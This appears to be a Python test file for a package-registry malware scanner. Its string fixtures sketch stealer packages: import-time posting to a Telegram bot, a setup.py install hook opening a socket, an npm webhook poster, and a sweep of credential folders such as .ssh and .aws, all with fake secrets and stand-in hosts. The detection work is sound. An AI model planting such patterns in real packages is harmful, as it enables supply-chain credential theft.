"""0.1.8: the exfiltration shapes (tests/scanner/test_exfiltration_shapes.py)
in registry scans: a wheel whose module sends a Telegram bot what it
collects, an sdist whose setup.py opens a socket to a hard-coded address, an
npm package whose main posts to a Slack webhook, and a module run only when
used (SC-USE-RISK) that sweeps credential folders — each SUSPICIOUS; and a
wheel that talks to Telegram with its user's token stays OK. The secrets are
fake and built here; hosts are .invalid or TEST-NET; nothing runs.
"""
import json
import unittest

from tests.registry._review_support import scan_npm, scan_sdist, scan_wheel

TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3"
SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuVwX"
META = "Name: lit\nVersion: 1.0\n"


def reasons(res, rule):
    return [(i["file"], i["sev"], i["msg"]) for i in res["issues"] if i["rule"] == rule]


class ExfiltrationRegistryTests(unittest.TestCase):
    def test_a_wheel_that_reports_to_its_authors_bot(self):
        stealer = ("import getpass, requests\nTOKEN = '" + TG + "'\ndef initialize():\n    user = getpass.getuser()\n"
                   "    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', json={'text': user})\n")
        res = scan_wheel({"lit/__init__.py": "from .core import *\ninitialize()\n", "lit/core.py": stealer,
                          "lit-1.0.dist-info/METADATA": META})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertIn(("lit/core.py", "CRITICAL", "lit/core.py runs when the package is loaded, and it sends data to a "
                       "Telegram bot whose token is written in the code (bot 123456789)."),
                      reasons(res, "SC-IMPORT-RISK"))

    def test_an_sdist_whose_setup_py_opens_a_socket(self):
        setup = ("import socket\nfrom setuptools import setup\nfrom setuptools.command.install import install\n"
                 "class P(install):\n    def run(self):\n        ip = '203.0.113.5'\n"
                 "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((ip, 12345))\n"
                 "        install.run(self)\nsetup(name='x', version='1.0', cmdclass={'install': P})\n")
        res = scan_sdist({"setup.py": setup, "x/__init__.py": ""})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertTrue(any("contacts an address typical of data exfiltration (203.0.113.5)" in m
                            for _f, _s, m in reasons(res, "SC-INSTALL-HOOK") + reasons(res, "SC-IMPORT-RISK")),
                        res["issues"])

    def test_an_npm_main_that_posts_to_a_slack_webhook(self):
        main = ("var webhookUrl = 'https://" + SLACK + "';\nasync function send(m) {\n"
                "  await fetch(webhookUrl, { method: 'POST', body: JSON.stringify({ text: m }) });\n}\n"
                "module.exports = { send };\n")
        res = scan_npm({"package.json": json.dumps({"name": "x", "version": "1.0.0", "main": "dist/index.js"}),
                        "dist/index.js": main})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_a_credential_sweep_in_a_module_run_when_used(self):
        core_py = ("import os, urllib.request\nDIRS = ['.ssh', '.aws', '.ethereum', '.docker', '.kube']\n"
                   "def scan(hooks, data):\n    for wh in hooks:\n"
                   "        urllib.request.urlopen(urllib.request.Request(wh, data=data))\n")
        res = scan_wheel({"lit/__init__.py": "", "lit/tools/sweep.py": core_py, "lit-1.0.dist-info/METADATA": META})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_a_client_with_its_users_token_stays_ok(self):
        client = ("import requests\nclass Bot:\n    def __init__(self, token):\n        self.token = token\n"
                  "    def send(self, chat, text):\n        return requests.post(f'https://api.telegram.org/bot"
                  "{self.token}/sendMessage', json={'chat_id': chat, 'text': text})\n")
        res = scan_wheel({"lit/__init__.py": "from .bot import Bot\n", "lit/bot.py": client,
                          "lit-1.0.dist-info/METADATA": META})
        self.assertEqual(res["verdict"], "OK", res["issues"])


if __name__ == "__main__":
    unittest.main()
